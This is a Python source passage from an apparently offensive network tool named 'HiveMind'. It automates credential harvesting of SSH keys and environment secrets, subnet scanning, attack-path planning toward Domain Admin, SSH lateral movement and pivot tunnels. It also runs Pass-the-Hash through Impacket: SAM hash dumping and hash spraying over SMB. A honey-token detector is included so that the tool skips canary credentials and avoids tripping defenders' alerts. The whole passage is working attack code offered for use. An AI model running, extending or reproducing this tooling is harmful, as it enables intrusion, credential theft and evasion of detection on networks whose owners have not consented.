        closed = self.tunnel_manager.close_all_tunnels()
        self.pivot_chain.clear()
        return closed

    def get_status(self) -> dict[str, Any]:
        """Get auto-pivot status.

        Returns:
            Status dict

        """
        return {
            "tunnels_active": len(self.pivot_chain),
            "pivot_chain": [
                {
                    "host": c.jump_host,
                    "port": c.local_port,
                    "type": c.tunnel_type,
                }
                for c in self.pivot_chain
            ],
            "all_tunnels": self.tunnel_manager.list_tunnels(),
        }


# =============================================================================
# HIVE MIND - MAIN ORCHESTRATOR
# =============================================================================


class HiveMind:
    """Main orchestrator for enterprise network intelligence.

    Coordinates:
    - Credential harvesting
    - Network mapping
    - AD analysis
    - Lateral movement
    - Attack path optimization

    Usage:
        hive = HiveMind()
        hive.initialize()
        paths = hive.find_attack_paths("Domain Admin")
        hive.execute_movement(paths[0])
    """

    def __init__(self) -> None:
        """Initialize Hive Mind."""
        self.harvester = CredentialHarvester()
        self.mapper = NetworkMapper()
        self.ad_analyzer = ADAnalyzer()
        self.mover = LateralMover()
        self.auto_pivot = AutoPivot(self.mapper, self.harvester)

        self.current_host: str | None = None
        self.initialized: bool = False

        logger.info("Hive Mind initialized")

    def initialize(self) -> dict[str, Any]:
        """Initialize Hive Mind with local reconnaissance.

        Returns:
            Dict with initialization results

        """
        results: dict[str, Any] = {
            "interfaces": [],
            "domain": None,
            "credentials_found": 0,
            "ssh_targets": [],
            "errors": [],
        }

        try:
            # Get local network info
            interfaces = self.mapper.get_local_interfaces()
            results["interfaces"] = interfaces
            if interfaces:
                self.current_host = interfaces[0]

            # Check for domain
            results["domain"] = self.ad_analyzer.detect_domain()

            # Harvest local credentials
            self.harvester.harvest_ssh_keys()
            self.harvester.harvest_environment()
            results["credentials_found"] = len(self.harvester.harvested)

            # Get SSH targets from known_hosts
            results["ssh_targets"] = self.harvester.harvest_known_hosts()[:10]

            self.initialized = True

        except Exception as e:
            if isinstance(results.get("errors"), list):
                results["errors"].append(str(e))
            logger.exception("Initialization error: %s", e)

        return results

    def scan_network(self, subnet: str | None = None) -> list[NetworkHost]:
        """Scan local network for hosts.

        Args:
            subnet: Subnet to scan (default: auto-detect)

        Returns:
            List of discovered hosts

        """
        if subnet is None and self.current_host:
            subnet = self.mapper.get_local_subnet(self.current_host)

        discovered = []

        if subnet:
            # Parse subnet and scan first 20 hosts (quick scan)
            try:
                network = ipaddress.IPv4Network(subnet, strict=False)
                for i, ip in enumerate(network.hosts()):
                    if i >= 20:  # Limit for quick scan
                        break
                    host = self.mapper.quick_scan(str(ip))
                    if host:
                        discovered.append(host)
            except ValueError as e:
                logger.exception("Invalid subnet: %s", e)

        return discovered

    def find_attack_paths(self, _target: str = "Domain Admin") -> list[AttackPath]:
        """Find attack paths to target.

        Args:
            target: Target (hostname, IP, or "Domain Admin")

        Returns:
            List of possible attack paths

        """
        paths: list[AttackPath] = []

        if not self.current_host:
            return paths

        # Calculate paths to each discovered host
        for host_ip in self.mapper.discovered_hosts:
            path = self.ad_analyzer.calculate_attack_path(
                source=self.current_host,
                target=host_ip,
                available_creds=self.harvester.harvested,
                discovered_hosts=self.mapper.discovered_hosts,
            )
            if path:
                paths.append(path)

        # Sort by probability
        paths.sort(key=lambda p: p.probability, reverse=True)

        return paths

    def _find_matching_credential(
        self,
        technique: MovementTechnique,
    ) -> Credential | None:
        """Find a credential matching the movement technique."""
        for c in self.harvester.harvested:
            if (
                technique == MovementTechnique.SSH
                and c.credential_type == CredentialType.SSH_KEY
            ):
                return c
            if (
                technique in [MovementTechnique.PSEXEC, MovementTechnique.PASS_THE_HASH]
                and c.credential_type == CredentialType.NTLM_HASH
            ):
                return c
        return None

    def _execute_hop(
        self,
        hop: str,
        technique: MovementTechnique,
        result: dict[str, Any],
    ) -> bool:
        """Execute a single hop in the attack path."""
        cred = self._find_matching_credential(technique)
        if not cred:
            result["output"] = f"No suitable credential for {technique.value}"
            return False

        if technique == MovementTechnique.SSH:
            move_result = self.mover.move_ssh(hop, cred.username, cred, "whoami")
            if move_result["success"]:
                result["hops_completed"] += 1
                result["final_position"] = hop
                self.current_host = hop
                return True
        elif technique in [MovementTechnique.PSEXEC, MovementTechnique.PASS_THE_HASH]:
            cmd = self.mover.generate_pth_command(hop, cred.username, cred.value)
            result["output"] = f"Manual execution required: {cmd}"
            return False
        return False

    def execute_movement(self, path: AttackPath) -> dict[str, Any]:
        """Execute lateral movement along attack path (Refactored for complexity)."""
        result = {
            "path": path,
            "success": False,
            "hops_completed": 0,
            "final_position": self.current_host,
            "output": "",
        }

        for i, hop in enumerate(path.hops):
            technique = (
                path.techniques[i] if i < len(path.techniques) else path.techniques[-1]
            )
            if not self._execute_hop(hop, technique, result):
                break

        result["success"] = result["hops_completed"] == len(path.hops)
        return result

    def get_status(self) -> dict[str, Any]:
        """Get current Hive Mind status."""
        return {
            "initialized": self.initialized,
            "current_host": self.current_host,
            "credentials": len(self.harvester.harvested),
            "discovered_hosts": len(self.mapper.discovered_hosts),
            "domain": self.ad_analyzer.domain_info.name
            if self.ad_analyzer.domain_info
            else None,
            "movement_stats": self.mover.get_movement_stats(),
            "pivot_status": self.auto_pivot.get_status(),
        }

    def setup_auto_pivot(
        self,
        target_subnet: str | None = None,
    ) -> dict[str, Any]:
        """Automatically find and pivot through suitable hosts.

        Args:
            target_subnet: Optional target subnet to reach

        Returns:
            Dict with pivot results

        """
        result = {
            "success": False,
            "tunnels_created": 0,
            "pivot_points": [],
            "proxy_config": {},
        }

        # Find pivot points and establish tunnels
        tunnels = self.auto_pivot.find_and_pivot(target_subnet)

        if tunnels:
            result["success"] = True
            result["tunnels_created"] = len(tunnels)
            result["pivot_points"] = [t.jump_host for t in tunnels]

            # Get proxy config for first tunnel
            if tunnels:
                result["proxy_config"] = self.auto_pivot.tunnel_manager.get_proxy_config(
                    tunnels[0].local_port
                )

        return result

    def create_tunnel(
        self,
        jump_host: str,
        username: str,
        tunnel_type: str = "socks5",
        remote_host: str | None = None,
        remote_port: int | None = None,
    ) -> dict[str, Any]:
        """Create a specific tunnel.

        Args:
            jump_host: Host to tunnel through
            username: SSH username
            tunnel_type: "socks5" or "forward"
            remote_host: Target host (for forward tunnels)
            remote_port: Target port (for forward tunnels)

        Returns:
            Tunnel config dict

        """
        # Find SSH credential for this user
        credential = None
        for cred in self.harvester.harvested:
            if (
                cred.credential_type == CredentialType.SSH_KEY
                and cred.username == username
            ):
                credential = cred
                break

        if tunnel_type == "socks5":
            config = self.auto_pivot.tunnel_manager.create_socks5_tunnel(
                jump_host=jump_host,
                username=username,
                credential=credential,
            )
        elif tunnel_type == "forward" and remote_host and remote_port:
            config = self.auto_pivot.tunnel_manager.create_port_forward(
                jump_host=jump_host,
                username=username,
                remote_host=remote_host,
                remote_port=remote_port,
                credential=credential,
            )
        else:
            return {"success": False, "error": "Invalid tunnel configuration"}

        return {
            "success": config.active,
            "local_port": config.local_port,
            "jump_host": config.jump_host,
            "tunnel_type": config.tunnel_type,
        }

    def list_tunnels(self) -> list[dict[str, Any]]:
        """List all active tunnels.

        Returns:
            List of tunnel info dicts

        """
        return self.auto_pivot.tunnel_manager.list_tunnels()

    def close_tunnels(self) -> int:
        """Close all tunnels.

        Returns:
            Number of tunnels closed

        """
        return self.auto_pivot.cleanup()


# =============================================================================
# MODULE-LEVEL FUNCTIONS
# =============================================================================


def get_hive_mind() -> HiveMind:
    """Get singleton HiveMind instance.

    Returns:
        HiveMind instance
    """
    global _hive_mind
    if _hive_mind is None:
        _hive_mind = HiveMind()
    return _hive_mind


def quick_recon() -> dict[str, Any]:
    """Quick local reconnaissance.

    Returns:
        Dict with recon results

    """
    hive = get_hive_mind()
    return hive.initialize()


# =============================================================================
# PASS-THE-HASH AUTOMATION
# =============================================================================


class PassTheHashAutomation:
    """Automate Pass-the-Hash attacks for lateral movement.

    Features:
    - NTLM hash extraction (from memory or files)
    - Hash spray across network
    - Automatic session establishment
    - Credential reuse chain building
    """

    def __init__(self) -> None:
        self.harvested_hashes: list[Credential] = []
        self.successful_auths: list[dict[str, Any]] = []
        self._impacket_available = self._check_impacket()

    def _check_impacket(self) -> bool:
        """Check if Impacket tools are available."""
        try:
            import shutil
            return shutil.which("impacket-smbclient") is not None or \
                   shutil.which("smbclient.py") is not None
        except Exception:
            return False

    def _parse_secretsdump_line(self, line: str) -> Credential | None:
        """Parse a single line from secretsdump output.

        Args:
            line: Output line in format username:rid:lm:nt:::

        Returns:
            Credential object or None if parsing fails
        """
        if ":::" not in line:
            return None

        parts = line.split(":")
        if len(parts) < 4:
            return None

        username = parts[0]
        ntlm_hash = parts[3] if len(parts[3]) == 32 else parts[2]

        return Credential(
            username=username,
            domain="LOCAL",
            credential_type=CredentialType.NTLM_HASH,
            value=ntlm_hash,
            source="SAM",
        )

    def extract_hashes_from_sam(self, sam_path: str, system_path: str) -> list[Credential]:
        """Extract NTLM hashes from SAM/SYSTEM files.

        Args:
            sam_path: Path to SAM file
            system_path: Path to SYSTEM file

        Returns:
            List of extracted credentials with NTLM hashes
        """
        hashes = []
        try:
            # Use secretsdump if available
            import subprocess
            result = subprocess.run(
                ["impacket-secretsdump", "-sam", sam_path, "-system", system_path, "LOCAL"],
                capture_output=True,
                text=True,
                timeout=60,
            )
            if result.returncode == 0:
                for line in result.stdout.splitlines():
                    cred = self._parse_secretsdump_line(line)
                    if cred:
                        hashes.append(cred)
                        self.harvested_hashes.append(cred)
        except Exception as e:
            logger.debug("SAM extraction failed: %s", e)

        return hashes

    def pth_smb(self, target: str, username: str, ntlm_hash: str, domain: str = "") -> dict[str, Any]:
        """Perform Pass-the-Hash via SMB.

        Args:
            target: Target IP or hostname
            username: Username to authenticate as
            ntlm_hash: NTLM hash (LM:NT format or just NT)
            domain: Domain (optional)

        Returns:
            Dict with success status and session info
        """
        if not self._impacket_available:
            return {"success": False, "error": "Impacket not available"}

        try:
            import subprocess
            # Format: DOMAIN/user@target -hashes LM:NT
            lm_hash = "aad3b435b51404eeaad3b435b51404ee"  # Empty LM
            nt_hash = ntlm_hash if len(ntlm_hash) == 32 else ntlm_hash.split(":")[-1]

            cmd = [
                "impacket-smbclient",
                f"{domain}/{username}@{target}" if domain else f"{username}@{target}",
                "-hashes", f"{lm_hash}:{nt_hash}",
                "-c", "shares",
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            if result.returncode == 0 and "ACCESS_DENIED" not in result.stdout:
                auth_result = {
                    "success": True,
                    "target": target,
                    "username": username,
                    "domain": domain,
                    "technique": "PTH-SMB",
                    "shares": self._parse_shares(result.stdout),
                }
                self.successful_auths.append(auth_result)
                logger.info("PTH success: %s@%s", username, target)
                return auth_result

            return {"success": False, "error": "Authentication failed"}

        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _parse_shares(self, output: str) -> list[str]:
        """Parse SMB shares from output."""
        shares = []
        for line in output.splitlines():
            if "$" in line or "Disk" in line:
                parts = line.split()
                if parts:
                    shares.append(parts[0])
        return shares

    def spray_hash(
        self,
        targets: list[str],
        username: str,
        ntlm_hash: str,
        domain: str = "",
    ) -> list[dict[str, Any]]:
        """Spray a single hash across multiple targets.

        Args:
            targets: List of target IPs/hostnames
            username: Username to authenticate as
            ntlm_hash: NTLM hash
            domain: Domain (optional)

        Returns:
            List of successful authentication results
        """
        successes = []
        for target in targets:
            result = self.pth_smb(target, username, ntlm_hash, domain)
            if result.get("success"):
                successes.append(result)
                logger.info("Hash spray success: %s -> %s", username, target)

        return successes

    def build_credential_chain(self) -> list[dict[str, Any]]:
        """Build a chain of credential reuse opportunities.

        Returns:
            List of credential reuse paths
        """
        chain = []
        for auth in self.successful_auths:
            chain.append({
                "from": auth.get("source", "initial"),
                "to": auth["target"],
                "via": auth["username"],
                "technique": auth.get("technique", "PTH"),
            })
        return chain


# =============================================================================
# HONEY-TOKEN DETECTION
# =============================================================================


class HoneyTokenDetector:
    """Detect honey tokens, canary files, and decoy credentials.

    Features:
    - Detect fake credentials designed to trigger alerts
    - Identify canary files and tokens
    - Pattern-based detection
    - Behavioral analysis
    """

    # Known honey token patterns
    HONEY_PATTERNS = [
        r"honey",
        r"canary",
        r"decoy",
        r"trap",
        r"fake",
        r"test.*admin",
        r"admin.*test",
        r"thinkst",  # Thinkst Canary
        r"canarytokens",
    ]

    # Suspicious file patterns
    CANARY_FILE_PATTERNS = [
        "passwords.txt",
        "credentials.txt",
        "secrets.txt",
        "admin_passwords.xlsx",
        "database_backup.sql",
        "private_keys.zip",
        "bitcoin_wallet.dat",
    ]

    def __init__(self) -> None:
        self.detected_tokens: list[dict[str, Any]] = []
        self._compiled_patterns = [re.compile(p, re.IGNORECASE) for p in self.HONEY_PATTERNS]

    def is_honey_credential(self, credential: Credential) -> bool:
        """Check if a credential appears to be a honey token.

        Args:
            credential: Credential to check

        Returns:
            True if credential appears to be a honey token
        """
        # Check username against patterns
        for pattern in self._compiled_patterns:
            if pattern.search(credential.username):
                self._record_detection("credential", credential.username, "pattern_match")
                return True

        # Check for suspiciously simple passwords
        if credential.credential_type == CredentialType.PASSWORD:
            suspicious_passwords = [
                "password", "password123", "admin123", "letmein",
                "welcome1", "changeme", "secret123",
            ]
            if credential.value.lower() in suspicious_passwords:
                self._record_detection("credential", credential.username, "common_password")
                return True

        # Check source for suspicious patterns
        for pattern in self._compiled_patterns:
            if pattern.search(credential.source):
                self._record_detection("credential", credential.username, "source_pattern")
                return True

        return False

    def is_canary_file(self, filepath: str) -> bool:
        """Check if a file appears to be a canary file.

        Args:
            filepath: Path to check

        Returns:
            True if file appears to be a canary
        """
        filename = os.path.basename(filepath).lower()

        # Check against known canary filenames
        for canary_name in self.CANARY_FILE_PATTERNS:
            if canary_name.lower() in filename:
                self._record_detection("file", filepath, "canary_filename")
                return True

        # Check for suspicious metadata
        try:
            stat = os.stat(filepath)
            # Files that are too convenient (recently modified, easily accessible)
            # could be honey files
            if stat.st_size == 0:
                self._record_detection("file", filepath, "empty_file")
                return True
        except OSError:
            pass

        return False

    def check_ad_object(self, object_name: str, properties: dict[str, Any]) -> bool:
        """Check if an AD object might be a honey object.

        Args:
            object_name: Name of the AD object
            properties: Object properties

        Returns:
            True if object appears to be a honey object
        """
        # Check name patterns
        for pattern in self._compiled_patterns:
            if pattern.search(object_name):
                self._record_detection("ad_object", object_name, "pattern_match")
                return True

        # Check for suspicious properties
        description = properties.get("description", "")
        if any(word in description.lower() for word in ["honeypot", "decoy", "test"]):
            self._record_detection("ad_object", object_name, "description_match")
            return True

        # Check for unusual adminCount
        if properties.get("adminCount") == 1 and "admin" not in object_name.lower():
            self._record_detection("ad_object", object_name, "suspicious_admincount")
            return True

        return False

    def _record_detection(self, token_type: str, identifier: str, reason: str) -> None:
        """Record a detected honey token."""
        detection = {
            "type": token_type,
            "identifier": identifier,
            "reason": reason,
            "timestamp": __import__("time").time(),
        }
        self.detected_tokens.append(detection)
        logger.warning("Honey token detected: %s (%s) - %s", identifier, token_type, reason)

    def get_detections(self) -> list[dict[str, Any]]:
        """Get all detected honey tokens.

        Returns:
            List of detection records
        """
        return self.detected_tokens

    def filter_safe_credentials(self, credentials: list[Credential]) -> list[Credential]:
        """Filter out potential honey credentials.

        Args:
            credentials: List of credentials to filter

        Returns:
            Filtered list with honey credentials removed
        """
        return [c for c in credentials if not self.is_honey_credential(c)]


# =============================================================================
# ENHANCED HIVE MIND INTEGRATION
# =============================================================================


# Add PTH and Honey Detection to HiveMind
def enhance_hive_mind(hive: HiveMind) -> None:
    """Enhance HiveMind with PTH automation and honey detection.

    Args:
        hive: HiveMind instance to enhance
    """
    hive.pth = PassTheHashAutomation()
    hive.honey_detector = HoneyTokenDetector()
    logger.info("HiveMind enhanced with PTH automation and honey detection")
